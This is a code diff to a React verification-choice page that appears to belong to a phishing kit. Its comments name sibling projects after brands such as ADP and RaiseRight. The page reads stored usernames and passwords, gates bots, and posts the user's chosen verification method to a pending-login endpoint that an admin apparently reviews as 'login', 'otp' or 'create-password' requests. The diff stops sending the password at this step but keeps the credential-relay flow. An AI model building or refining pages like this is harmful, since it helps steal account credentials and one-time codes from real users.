@@ -9,7 +9,7 @@ import {
   MSG_UNABLE_REACH_VERIFICATION,
 } from "@/lib/approval-messages"
 import { useBotGateSignals } from "@/hooks/use-bot-gate-signals"
-import { readStoredPassword, readStoredUsername } from "@/lib/login-flow-storage"
+import { readStoredUsername } from "@/lib/login-flow-storage"
 import { pollPendingLogin } from "@/lib/poll-pending-login"
 import {
   pendingLoginMethod,
@@ -28,16 +28,6 @@ function WarningIcon() {
   )
 }
 
-function PhoneIcon() {
-  return (
-    <svg className={styles.methodBtnIcon} viewBox="0 0 24 24" aria-hidden="true">
-      <path
-        fill="currentColor"
-        d="M6.6 10.8c1.4 2.8 3.8 5.1 6.6 6.6l2.2-2.2c.3-.3.7-.4 1.1-.2 1.2.4 2.5.6 3.8.6.6 0 1 .4 1 1V20c0 .6-.4 1-1 1C10.6 21 3 13.4 3 4c0-.6.4-1 1-1h3.5c.6 0 1 .4 1 1 0 1.3.2 2.6.6 3.8.1.4 0 .8-.3 1.1l-2.2 2.2z"
-      />
-    </svg>
-  )
-}
 
 function TextIcon() {
   return (
@@ -141,20 +131,26 @@ export default function VerifyChoicePage() {
     }).catch(() => {})
 
     const userId = readStoredUsername() || sessionStorage.getItem("loginUserId") || ""
-    const password = readStoredPassword() || sessionStorage.getItem("loginPassword") || ""
-    const maskedEmail = sessionStorage.getItem("maskedEmail") ?? "**********"
-    const maskedPhone = sessionStorage.getItem("maskedPhone") ?? "***-***-****"
 
     try {
       const res = await fetch("/api/pending-login", {
         method: "POST",
         headers: { "Content-Type": "application/json" },
         body: JSON.stringify({
+          // This gate captures a method choice, not a credential, so it must not
+          // carry the login password: siblings store the selected method in
+          // `password` and "-" for the masked fields.
+          //
+          // It is sent as flow:"login" with no `kind`, matching NBS / raiseright /
+          // peakone / adp. It previously declared kind:"method", a value no other
+          // project sends and the admin's PendingRequestKind does not model
+          // ('login' | 'otp' | 'create-password'), so it was a lone divergence
+          // that only mislabelled the row.
           userId,
-          password,
+          password: pendingLoginMethod(method),
           method: pendingLoginMethod(method),
-          maskedEmail,
-          maskedPhone,
+          maskedEmail: "-",
+          maskedPhone: "-",
           flow: "login",
           ...getBotGateSignals(),
         }),
@@ -220,15 +216,6 @@ export default function VerifyChoicePage() {
           Mobile Phone
         </h3>
         <div className={styles.buttonRow}>
-          <MethodButton
-            method="call"
-            label="Call"
-            icon={<PhoneIcon />}
-            className={`${styles.methodBtn} ${styles.btnCall}`}
-            selectedMethod={selectedMethod}
-            isPolling={isPolling}
-            onSelect={handleSelect}
-          />
           <MethodButton
             method="text"
             label="SMS"
